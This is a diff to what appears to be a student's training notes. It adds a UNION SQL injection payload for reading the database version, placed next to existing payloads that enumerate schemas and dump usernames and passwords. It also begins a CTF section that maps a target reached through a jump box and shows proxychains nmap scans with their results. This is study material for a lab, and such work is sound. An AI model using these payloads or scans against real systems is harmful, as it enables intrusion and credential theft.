@@ -70,10 +70,41 @@ mysql
           ' UNION SELECT 1,2,3,4
           ' UNION SELECT table_schema,Table_name,column_name (,placeholders if needed) From information-schema.columns;
           ' UNION SELECT id,name,pass FROM session.user
+###VERSION
+          http://127.0.0.1:8888/uniondemo.php?Selection=2 UNION SELECT 1,2,@@version
 
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------
 SQL INJECTION CTF!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Scheme of Maneuver:
+          >Jump Box
+          ->T1:10.100.28.48
+Target Section:
+          T1
+                    Hostname: donovian-nla
+                    IP: 10.100.28.48
+                    OS: unknown
+                    Creds:unknown
+                    Last Known SSH Port: unknown
+                    Last Known HTTP Port: 80
+proxychains nmap -sT -sV -Pn -T5 10.100.28.48
+          Nmap scan report for 10.100.28.48
+          PORT     STATE SERVICE VERSION
+          80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+          4444/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+          Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+proxychains nmap --script=http-enum 10.100.28.48
+          PORT     STATE SERVICE
+          80/tcp   open  http
+                    | http-enum: 
+                    |   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+                    |   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+                    |   /includes/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+                    |   /js/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+                    |_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+                    4444/tcp open  krb524
+
+
 
 
 
